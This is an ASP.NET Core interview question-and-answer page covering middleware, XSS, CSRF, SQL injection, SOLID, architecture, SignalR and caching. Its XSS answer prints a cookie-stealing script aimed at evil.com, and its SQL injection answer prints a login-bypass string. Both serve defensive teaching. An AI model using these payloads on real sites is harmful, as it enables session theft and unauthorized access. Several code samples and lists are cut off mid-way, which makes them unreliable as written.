    private readonly ILogger<GlobalExceptionMiddleware> _logger;
    
    public GlobalExceptionMiddleware(RequestDelegate next, ILogger<GlobalExceptionMiddleware> logger)
    {
        _next = next;
        _logger = logger;
    }
    
    public async Task InvokeAsync(HttpContext context)
    {
        try
        {
            await _next(context);
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Unhandled exception occurred");
            await HandleExceptionAsync(context, ex);
        }
    }

    {
        context.Response.ContentType = "application/json";

            ValidationException ve => (400, ve.Message),
            UnauthorizedAccessException => (401, "Unauthorized"),
            _ => (500, "An internal error occurred")
        };
        
        context.Response.StatusCode = statusCode;
        
        await context.Response.WriteAsJsonAsync(new
        {
            StatusCode = statusCode,
            Message = message,
            Timestamp = DateTime.UtcNow
        });
    }
}

82 Q82. What is Cross-Site Scripting (XSS) and how to prevent it? ▼ 
XSS: Attacker injects malicious JavaScript into web pages viewed by other users.

Types:
1. Stored XSS: Script saved in database, served to all users
2. Reflected XSS: Script in URL, reflected in response
3. DOM-based XSS: Script manipulates client-side DOM

Example attack:
// User submits comment: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
// If rendered without encoding, script executes for all viewers

Prevention in ASP.NET Core:

1. Razor auto-encodes by default:
@Model.UserInput  // Automatically HTML-encoded (safe!)
// <script>alert('xss')</script> ? &lt;script&gt;alert('xss')&lt;/script&gt;

2. DON'T use Html.Raw with user input:
@Html.Raw(Model.UserInput)  // ? DANGEROUS! No encoding!
@Html.Raw(Model.SafeHtmlFromAdmin)  // Only for trusted content

3. Use AntiXSS for specific contexts:
using System.Text.Encodings.Web;
var encoded = HtmlEncoder.Default.Encode(userInput);
var jsEncoded = JavaScriptEncoder.Default.Encode(userInput);
var urlEncoded = UrlEncoder.Default.Encode(userInput);

4. Content Security Policy header:
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("Content-Security-Policy", 
        "default-src 'self'; script-src 'self'");

CSRF (Cross-Site Request Forgery): Attacker tricks authenticated user into 
making unwanted requests to a site where they're logged in.

Attack scenario:
1. User logs into bank.com (has auth cookie)
2. User visits evil.com
3. evil.com has hidden form that POSTs to bank.com/transfer

5. Bank processes transfer (thinks it's legitimate)

2. On POST, server validates both tokens match
3. Attacker can't get the token (same-origin policy)

84 Q84. What is SQL Injection and how EF Core prevents it? ▼ 
SQL Injection: Attacker manipulates SQL queries by injecting malicious SQL 
through user input.

Vulnerable code (raw string concatenation):
// ? NEVER DO THIS!
var query = "SELECT * FROM Users WHERE Username = '" + username + "' AND Password = '" + password + "'";
// Input: username = "admin' OR '1'='1' --"
// Becomes: SELECT * FROM Users WHERE Username = 'admin' OR '1'='1' --' AND Password = ''
// Returns all users!

How EF Core prevents SQL Injection:

1. LINQ queries (always safe):
var user = await _context.Users
    .Where(u => u.Username == username && u.Password == passwordHash)
    .FirstOrDefaultAsync();
// EF generates parameterized query automatically

2. Parameterized raw SQL:
// Safe - uses parameters
var products = await _context.Products
    .FromSqlInterpolated($"SELECT * FROM Products WHERE Name = {userInput}")
    .ToListAsync();
// userInput is sent as @p0 parameter, not concatenated

// Also safe
var products = await _context.Products
    .FromSqlRaw("SELECT * FROM Products WHERE Name = {0}", userInput)
    .ToListAsync();

3. NEVER concatenate user input:
// ? DANGEROUS!
var products = await _context.Products
    .FromSqlRaw("SELECT * FROM Products WHERE Name = '" + userInput + "'")
    .ToListAsync();

Additional protections:
- Use stored procedures with parameters
- Validate and sanitize input
- Use least-privilege database accounts
- Use ORM (EF Core) instead of raw SQL when possible

from WRITE operations into different models.

Traditional (single model for read + write):
ProductService.GetAll()     ? Same model
ProductService.Create(dto)  ? Same model

CQRS (separate models):
Query (Read): ProductQueryService ? ProductReadDto (optimized for display)
Command (Write): ProductCommandService ? CreateProductCommand (optimized for validation)

    }
}

95 Q95. What is Clean Architecture / Onion Architecture? ▼ 
Clean Architecture organizes code in concentric layers where dependencies 
point INWARD (inner layers don't know about outer layers).

Layers (inside ? outside):
1. DOMAIN (innermost - no dependencies):
   - Entities (business objects)
   - Value Objects
   - Interfaces (IRepository, IService)
   - Domain exceptions
   - Business rules

2. APPLICATION (uses Domain):
   - Use cases / Application services
   - DTOs / ViewModels
   - Commands & Queries (CQRS)
   - Interface implementations coordination
   - Validation

3. INFRASTRUCTURE (implements interfaces):
   - Database (EF Core, DbContext)
   - Repository implementations
   - External services (email, payment)
   - File system access
   - Third-party integrations

4. PRESENTATION (outermost):
   - Controllers
   - Views
   - API endpoints
   - Middleware
   - Program.cs

Project structure:
MyApp.Domain/           ? Entities, Interfaces
MyApp.Application/      ? Services, DTOs, Commands, Queries
MyApp.Infrastructure/   ? EF Core, Repositories, External services
MyApp.Web/              ? Controllers, Views, Program.cs

Dependency rule:
- Domain depends on NOTHING
- Application depends on Domain
- Infrastructure depends on Application + Domain
- Web depends on all (but only for DI registration)

Benefits:
- Independent of frameworks
- Testable (mock outer layers)
- Independent of database
- Business logic is protected in center
- Easy to swap infrastructure
96 Q96. What is SOLID principles � explain each with examples? ▼ 
S - Single Responsibility Principle:
Each class should have ONE reason to change.

// ? Bad: One class does everything
public class Employee
{
    public void CalculateSalary() { }
    public void SaveToDatabase() { }
    public void SendEmail() { }
    public void GenerateReport() { }
}

// ? Good: Each class has one job
public class SalaryCalculator { public decimal Calculate(Employee emp) { } }
public class EmployeeRepository { public void Save(Employee emp) { } }
public class EmailService { public void Send(string to, string body) { } }
public class ReportGenerator { public byte[] Generate(Employee emp) { } }

O - Open/Closed Principle:
Open for extension, closed for modification.

// ? Bad: Must modify class to add new discount type
public class DiscountCalculator
{
    public decimal Calculate(string type, decimal price)
    {
        if (type == "seasonal") return price * 0.1m;
        if (type == "clearance") return price * 0.5m;
        // Must add new if for every new type!
    }
}

// ? Good: Extend without modifying
public interface IDiscountStrategy { decimal Calculate(decimal price); }
public class SeasonalDiscount : IDiscountStrategy { public decimal Calculate(decimal price) => price * 0.1m; }
public class ClearanceDiscount : IDiscountStrategy { public decimal Calculate(decimal price) => price * 0.5m; }
// Add new discount: just create new class, no modification needed

L - Liskov Substitution Principle:
Subtypes must be substitutable for their base types.

// ? Bad: Square breaks Rectangle behavior
public class Rectangle { public virtual int Width { get; set; } public virtual int Height { get; set; } }
public class Square : Rectangle
{
    public override int Width { set { base.Width = value; base.Height = value; } }
    // Breaks: setting Width also changes Height (unexpected!)
}

// ? Good: Use interface/abstract properly
public interface IShape { double Area(); }
public class Rectangle : IShape { public double Area() => Width * Height; }
public class Square : IShape { public double Area() => Side * Side; }

I - Interface Segregation Principle:
Clients shouldn't depend on interfaces they don't use.

// ? Bad: Fat interface
public interface IWorker { void Work(); void Eat(); void Sleep(); }
// Robot can't Eat or Sleep!

// ? Good: Segregated interfaces
public interface IWorkable { void Work(); }
public interface IFeedable { void Eat(); }
public class Human : IWorkable, IFeedable { }
public class Robot : IWorkable { }  // Only implements what it needs

D - Dependency Inversion Principle:
High-level modules shouldn't depend on low-level modules. Both should depend on abstractions.

// ? Bad: Controller depends on concrete class
public class OrderController
{
    private readonly SqlOrderRepository _repo = new SqlOrderRepository();  // Tight coupling!
}

// ? Good: Depend on abstraction
public class OrderController
{
    private readonly IOrderRepository _repo;
    public OrderController(IOrderRepository repo) { _repo = repo; }  // DI!
}
97 Q97. What is the difference between Microservices and Monolithic? ▼ 
MONOLITHIC:
- Single deployable unit
- All features in one project/solution
- Single database
- Scales as a whole unit
- Simpler to develop initially
- Harder to scale specific features

MICROSERVICES:
- Multiple small, independent services
- Each service has its own database
- Independently deployable
- Scales individually
- Complex infrastructure (API Gateway, service discovery)
- Better for large teams

| Feature        | Monolithic           | Microservices          |
|----------------|----------------------|------------------------|
| Deployment     | Single unit          | Independent services   |
| Database       | Shared               | Per service            |
| Scaling        | Entire app           | Individual service     |
| Team size      | Small-medium         | Large                  |
| Complexity     | Low initially        | High initially         |
| Communication  | In-process           | HTTP/gRPC/Message bus  |
| Failure        | Entire app down      | Partial failure        |
| Technology     | Single stack         | Polyglot possible      |

When to use Monolithic:
- Small team (< 10 developers)
- Simple application
- Startup/MVP phase
- Limited DevOps expertise

When to use Microservices:
- Large team with multiple squads
- Need independent scaling
- Different parts need different tech stacks
- High availability requirements
- Complex domain with clear boundaries

104 Q104. What transport methods does SignalR use? ▼ 
SignalR automatically negotiates the best transport:

1. WebSocket (preferred):
   - Full-duplex, persistent connection
   - Lowest latency
   - Most efficient
   - Requires server support

2. Server-Sent Events (SSE):
   - Server ? Client only (one-way)
   - Uses standard HTTP
   - Fallback when WebSocket unavailable
   - Not supported in IE

3. Long Polling:
   - Client repeatedly asks server for updates
   - Highest latency
   - Works everywhere (last resort fallback)
   - Most resource-intensive

SignalR tries in order: WebSocket ? SSE ? Long Polling

Force specific transport:
const connection = new signalR.HubConnectionBuilder()
    .withUrl("/chatHub", { transport: signalR.HttpTransportType.WebSockets })
    .build();

IN-PROCESS (default, faster):
- App runs INSIDE IIS worker process (w3wp.exe)
- Single process
- Better performance (no proxy overhead)
- Uses IIS HTTP Server (not Kestrel)

<aspNetCore hostingModel="InProcess" />

Flow: Internet ? IIS ? ASP.NET Core (same process)

OUT-OF-PROCESS:
- App runs in SEPARATE process (dotnet.exe)
- Kestrel is the web server
- IIS acts as reverse proxy
- Two processes

<aspNetCore hostingModel="OutOfProcess" />

Flow: Internet ? IIS (proxy) ? Kestrel ? ASP.NET Core

| Feature        | In-Process           | Out-of-Process       |
|----------------|----------------------|----------------------|
| Performance    | Faster               | Slightly slower      |
| Process        | w3wp.exe             | dotnet.exe           |
| Web server     | IIS HTTP Server      | Kestrel              |
| Startup        | Faster               | Slower               |
| Debugging      | Harder               | Easier               |
| Cross-platform | No (IIS only)        | Yes                  |

Recommendation: Use In-Process for production on IIS (better performance).

    private readonly ILogger<RequestResponseLoggingMiddleware> _logger;

        _logger = logger;
    }

    public async Task InvokeAsync(HttpContext context)
    {
        // Log Request
        var request = context.Request;
        _logger.LogInformation("Request: {Method} {Path} {QueryString}", 
            request.Method, request.Path, request.QueryString);

        // Capture response
        var originalBody = context.Response.Body;
        using var responseBody = new MemoryStream();
        context.Response.Body = responseBody;

        var stopwatch = Stopwatch.StartNew();
        await _next(context);
        stopwatch.Stop();

        // Log Response
        _logger.LogInformation("Response: {StatusCode} in {ElapsedMs}ms", 
            context.Response.StatusCode, stopwatch.ElapsedMilliseconds);

        // Copy response back
        responseBody.Seek(0, SeekOrigin.Begin);
        await responseBody.CopyToAsync(originalBody);
    }
}

111Why does Middleware order matter? What happens if wrong order?▼
Middleware executes in the ORDER you add them. Wrong order = broken app.

CORRECT ORDER:
app.UseExceptionHandler("/Error");  // 1. Catch all exceptions
app.UseHttpsRedirection();          // 2. Redirect HTTP to HTTPS
app.UseStaticFiles();               // 3. Serve CSS/JS/images (short-circuit)
app.UseRouting();                   // 4. Match URL to endpoint
app.UseCors();                      // 5. CORS headers
app.UseAuthentication();            // 6. WHO are you? (validate token)
app.UseAuthorization();             // 7. Are you ALLOWED? (check roles)
app.MapControllers();               // 8. Execute controller action

What breaks with wrong order:

// BUG: Auth before Routing
app.UseAuthentication();  // Can't authenticate - doesn't know the endpoint yet!
app.UseRouting();

// BUG: Static files after Auth
app.UseAuthentication();
app.UseStaticFiles();  // Now CSS/JS requires login!

// BUG: CORS after Authorization
app.UseAuthorization();
app.UseCors();  // CORS headers not added to 401/403 responses!

// BUG: Exception handler in middle
app.UseRouting();
app.UseExceptionHandler();  // Won't catch exceptions in UseRouting!

Rule: Exception handling FIRST, Static files BEFORE auth, Auth BEFORE authorization.

- Shared across multiple app servers
- Survives app restart
- Slightly slower (network call)
- Good for: load-balanced apps, large data

builder.Services.AddStackExchangeRedisCache(options =>
{
    options.Configuration = "localhost:6379";
});

public class ProductService
{
    private readonly IDistributedCache _cache;

    public async Task<List<Product>> GetAllAsync()
    {
        var cached = await _cache.GetStringAsync("products");
        if (cached != null)
            return JsonSerializer.Deserialize<List<Product>>(cached);

        var products = await _repo.GetAllAsync();
        await _cache.SetStringAsync("products",
            JsonSerializer.Serialize(products),
            new DistributedCacheEntryOptions
            {
                AbsoluteExpirationRelativeToNow = TimeSpan.FromMinutes(10)
            });
        return products;
    }
}

| Feature        | In-Memory          | Distributed (Redis)  |
|----------------|--------------------|-----------------------|
| Speed          | Fastest            | Fast (network hop)    |
| Shared         | No (single server) | Yes (all servers)     |
| Survives restart| No                | Yes                   |
| Scale          | Limited            | Scales well           |
| Use when       | Single server      | Multiple servers/pods |
